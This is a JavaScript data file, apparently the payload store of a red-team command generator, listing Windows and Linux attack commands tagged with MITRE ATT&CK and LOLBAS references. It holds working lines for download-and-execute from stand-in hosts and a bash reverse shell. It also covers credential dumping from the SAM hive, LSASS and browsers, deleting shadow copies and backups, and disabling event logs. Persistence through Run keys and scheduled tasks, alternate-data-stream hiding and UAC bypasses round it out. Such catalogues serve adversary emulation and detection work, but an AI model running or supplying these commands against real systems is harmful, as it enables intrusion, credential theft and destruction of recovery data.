/**
 * All payloads are stored here. This data is used for generating payloads from the options selected by users.
 * 
 * Schema:
 * {
 *      Purpose: {
 *          Binary: {
 *              Command: String,
 *              Cli: String?,
 *              AdminRequired: Bool,
 *              MitreAtt&ck: {
 *                  ID: String,
 *                  URL: String,
 *              }?,
 *              LOLBAS: String?,
 *          }
 *      }
 * }
 */
const PAYLOADS = {
    'Archive': {
        'PowerShell (Compress-Archive)': {
            'cmd': 'Compress-Archive -Path data.txt -DestinationPath data.zip -Force',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1560', 'url': 'https://attack.mitre.org/techniques/T1560/'},
            'lolbas': null,
            'desc': null,
        },
        'tar': {
            'cmd': 'tar -czvf data.tar.gz data.txt',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1560', 'url': 'https://attack.mitre.org/techniques/T1560/'},
            'lolbas': null,
            'desc': null,
        },
    },
    'Copy': {
        'Bitsadmin': {
            'cmd': 'bitsadmin /CREATE 1;bitsadmin /ADDFILE 1 C:\\Windows\\System32\\calc.exe C:\\calc.exe;bitsadmin /RESUME 1;bitsadmin /COMPLETE 1;bitsadmin /RESET',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/',
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Wmic': {
            'cmd': 'wmic datafile where "Name=\'C:\\Windows\\System32\\calc.exe\'" call Copy "C:\\calc.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        }
    },
    'Delete Backups': {
        'Wbadmin': {
            'cmd': 'wbadmin delete backup',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': null,
        },
        'Wbadmin (Catalog)': {
            'cmd': 'wbadmin delete catalog -quiet',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command erases Windows Backup Catalog.',
        },
    },
    'Delete Shadow Copies': {
        'Bcdedit': {
            'cmd': 'bcdedit /set {default} bootstatuspolicy ignoreallfailures;bcdedit /set {default} recoveryenabled no',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Diskshadow': {
            'cmd': 'diskshadow delete shadows all',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': null,
        },
        'Vssadmin': {
            'cmd': 'vssadmin delete shadows /all /quiet',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': null,
        },
        'Wmic': {
            'cmd': 'wmic shadowcopy delete',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': null,
        },
    },
    'Disable Command Logging': {
        'PowerShell (Set-PSReadLineOption)': {
            'cmd': 'Set-PSReadlineOption -HistorySaveStyle SaveNothing',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1562.003', 'url': 'https://attack.mitre.org/techniques/T1562/003/'},
            'lolbas': null,
            'desc': 'The command avoids storing PowerShell command history anywhere.',
        },
    },
    'Disable Event Logging': {
        'PowerShell (Stop-Service)': {
            'cmd': 'Stop-Service -Name EventLog -Force',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
            'lolbas': null,
            'desc': 'The command stops the EventLog service. To restart it, run \'Start-Service -Name EventLog\' command.',
        },
        'Reg (System)': {
            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System /v Start /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
            'lolbas': null,
            'desc': 'The command sets 0 to the Start value for disabling System EventLog. We must reboot the system to apply this change. To restore it, set 1 to the Start value.'
        },
        'Reg (Application)': {
            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application /v Start /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
            'lolbas': null,
            'desc': 'The command sets 0 to the Start value for disabling All EventLogs. We must reboot the ssytem to apply this change. To restore it, set 1 to the Start value.'
        },
    },
    'Download': {
        'Certutil': {
            'cmd': 'certutil -urlcache -split -f http://example.com/evil.exe .\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/',
            'desc': null,
        },
        'PowerShell': {
            'cmd': 'iwr -uri http://example.com/evil.exe -outfile .\\evil.exe',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, call "powershell" before the command such as "powershell -nop iwr -uri ..."',
        },
        'Mshta': {
            'cmd': 'mshta https://evil.com/evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': null,
        },
    },
    'Download & Execute': {
        'PowerShell': {
            'cmd': 'IEX((New-Object Net.WebClient).DownloadString("https://10.0.0.1/evil.ps1"))',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': 'If you run it on Commnad Prompt, call "powershell" before the command such as "powershell -nop -c \"IEX((...".',
        },
    },
    'Dump Credentials': {
        'PowerShell (WinPwn)': {
            'cmd': 'IEW(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');Kittielocal -noninteractive -browsercredentials',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1555.003', 'url': 'https://attack.mitre.org/techniques/T1555/003/'},
            'lolbas': null,
            'desc': 'The command imports the WinPwn module and dumps credentials from web browsers.',
        },
        'Reg': {
            'cmd': 'reg save HKLM\\SECURITY .\\security.bak;reg save HKLM\\SYSTEM .\\system.bak;reg save HKLM\\SAM .\\sam.bak',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1003.002', 'url': 'https://attack.mitre.org/techniques/T1003/002/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Reg/',
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Rundll32': {
            'cmd': 'rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump <LSASS_PID> C:\\lsass.dmp full',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': 'Replace \'<LSASS_PID>\' with actual PID of "lsass.exe". To find it, use \'Get-Process\' or \'tasklist\' command.',
        },
    },
    'Enumerate': {
        'Arp': {
            'cmd': 'arp -a',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network adapter and interface information.',
        },
        'Fsutil (drives)': {
            'cmd': 'fsutil fsinfo drives',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command enumerates all drives on the target system.',
        },
        'Hostname': {
            'cmd': 'hostname',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': null,
        },
        'Ipconfig': {
            'cmd': 'ipconfig /all',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates IP addresses in the local network.',
        },
        'Nbtstat': {
            'cmd': 'nbtstat -n',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates NetBIOS names and IP addresses.',
        },
        'Net (user)': {
            'cmd': 'net user',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The commnad enumerates local user accounts.',
        },
        'Net (localgroup)': {
            'cmd': 'net localgroup',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local groups.',
        },
        'Net (config)': {
            'cmd': 'net config workstation',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command enumerates network configuration information.',
        },
        'Netsh': {
            'cmd': 'netsh interface show interface',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network interface information and status.',
        },
        'PowerShell (Get-ComputerInfo)': {
            'cmd': 'Get-ComputerInfo',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates computer information.',
        },
        'PowerShell (Get-EventLog)': {
            'cmd': 'Get-EventLog security -InstanceId 4624 -Newest 10',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1654', 'url': 'https://attack.mitre.org/techniques/T1654/'},
            'lolbas': null,
            'desc': 'The command enumerates successful logon events.',
        },
        'PowerShell (Get-LocalUser)': {
            'cmd': 'Get-LocalUser',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local user accounts.',
        },
        'PowerShell (Get-LocalGroup)': {
            'cmd': 'Get-LocalGroup',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local groups.',
        },
        'PowerShell (Get-NetAdapter)': {
            'cmd': 'Get-NetAdapter',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates network adapter information.',
        },
        'PowerShell (Get-Process)': {
            'cmd': 'Get-Process',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.'
        },
        'Route': {
            'cmd': 'route print',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network adapter and interface information.',
        },
        'Systeminfo': {
            'cmd': 'systeminfo',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': null,
        },
        'Tasklist': {
            'cmd': 'tasklist',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.',
        },
        'Ver': {
            'cmd': 'ver',
            'cli': 'Command Prompt',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command prints OS information.',
        },
        'Vssadmin (list shadows)': {
            'cmd': 'vssadmin list shadows',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates shadow copies.',
        },
        'Vssadmin (list volumes)': {
            'cmd': 'vssadmin list volumes',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates volumes.',
        },
        'Wevtutil': {
            'cmd': 'wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:10',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command enumerates successful logon events.'
        },
        'Wmic (useraccount)': {
            'cmd': 'wmic useraccount get /ALL',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates detailed information of local user accounts. If you find the output difficult to see, try adding the \'/format:csv\' option.',
        },
        'Wmic (nic)': {
            'cmd': 'wmic nic get macaddress,name /format:csv',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates network information.',
        },
        'Wmic (os)': {
            'cmd': 'wmic os get buildnumber,caption,countrycode,osarchitecture,oslanguage,ostype,registereduser,serialnumber,version,windowsdirectory /format:csv',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates OS information.',
        },
        'Wmic (process)': {
            'cmd': 'wmic process get caption,executablepath,commandline,processid /format:csv',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.',
        },
    },
    'Execute': {
        'Bash': {
            'cmd': 'bash -c "echo hello"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Bash (Reverse Shell)': {
            'cmd': 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Mshta': {
            'cmd': 'mshta C:\\evil.hta',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': 'This command executes arbitrary JavaScript code in the .hta file. The .hta file must consist of HTML source code.',
        },
        'Psexec': {
            'cmd': 'psexec \\\\example.local -accepteula evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
            'lolbas': null,
            'desc': 'Replace \'example.local\' with the address or the computer name of the target system. Additionally, it may need to specify username (\'-u\') and password (\'-p\').',

        },
        'Shell32': {
            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
            'desc': null,
        },
    },
    'Execute DLL': {
        'Rundll32': {
            'cmd': 'rundll32 evil.dll,EntryPoint',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': 'Replace \'EntryPoint\' with the entry point of the DLL such as "DllMain" or other exported function marked with \'__declspec(dllexport)\'.',
        },
        'Shell32': {
            'cmd': 'rundll32 shell32.dll,Control_RunDLL C:\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
            'desc': null,
        },
    },
    'Execute EXE': {
        'Bash': {
            'cmd': 'bash -c evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Conhost 1': {
            'cmd': 'conhost evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Conhost/',
            'desc': null,
        },
        'Conhost 2': {
            'cmd': 'conhost --headless evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Conhost/',
            'desc': null,
        },
        'Explorer 1': {
            'cmd': 'explorer C:\\Windows\\System32\\calc.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Explorer/',
            'desc': null,
        },
        'Explorer 2': {
            'cmd': 'explorer /root,"C:\\Windows\\System32\\calc.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Explorer/',
            'desc': null,
        },
        'PowerShell (Invoke-WmiMethod)': {
            'cmd': '$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"));$NewClass = $Class.Derive("Win32_Evil").Put();Invoke-WmiMethod -Path Win32_Evil -Name create -ArgumentList evil.exe',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': false,
            'desc': null,
        },
        'Rundll32': {
            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': null,
        },
        'Schtasks': {
            'cmd': 'schtasks /Create /SC MINUTE /MO 1 /TN "My Task" /TR C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
            'desc': 'The command adds the task that executes arbitrary .exe file every minute.',
        },
        'Wmic': {
            'cmd': 'wmic process call create calc.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        },
    },
    'Execute Hidden Files': {
        'Cmd': {
            'cmd': 'cmd /c start "" "file.docx:payload.bat"',
            'cli': 'Command Prompt',
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
            'desc': null,
        },
        'Mshta': {
            'cmd': 'mshta "C:\\file.txt:evil.hta"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': 'The command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
        },
        'Wmic': {
            'cmd': 'wmic process call create "C:\\file.txt:evil.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        },
    },
    'Hide Files': {
        'Cmd': {
            'cmd': 'cmd /c echo regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll > file.docx:payload.bat',
            'cli': 'Command Prompt',
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
            'desc': 'The command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
        }
    },
    'Persistence': {
        'Netsh': {
            'cmd': 'netsh add helper C:\\evil.dll',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1546.007', 'url': 'https://attack.mitre.org/techniques/T1546/007/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
            'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run.'
        },
        'Reg (Unprivileged)': {
            'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': 'The commnad will cause arbitrary executable file or command to run when the current user logs on.',
        },
        'Reg (Privileged)': {
            'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': 'The commnad will cause arbitrary executable file or command to run when any user on the system logs on.',
        },
        'Schtasks': {
            'cmd': 'schtasks /Create /SC ONLOGON /TN "My Task" /TR C:\\evil.exe /RU SYSTEM',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
            'desc': null,
        },
    },
    'UAC Bypass': {
        'Computerdefaults': {
            'cmd': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d "" /f;reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d "cmd.exe" /f;start computerdefaults.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Eventvwr': {
            'cmd': 'reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /v DelegateExecute /t REG_SZ /d "" /f;reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /ve /t REG_SZ /d "cmd /c start cmd" /f;start eventvwr.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Fodhelper': {
            'cmd': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d "cmd.exe" /f;start fodhelper.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'PowerShell (WinPwn)': {
            'cmd': 'IEX(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');UACBypass -noninteractive -command "C:\\evil.exe" -technique ccmstp',
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'The command imports the WinPwn module and executes arbitrary command while bypassing UAC.',
        },
    },
};
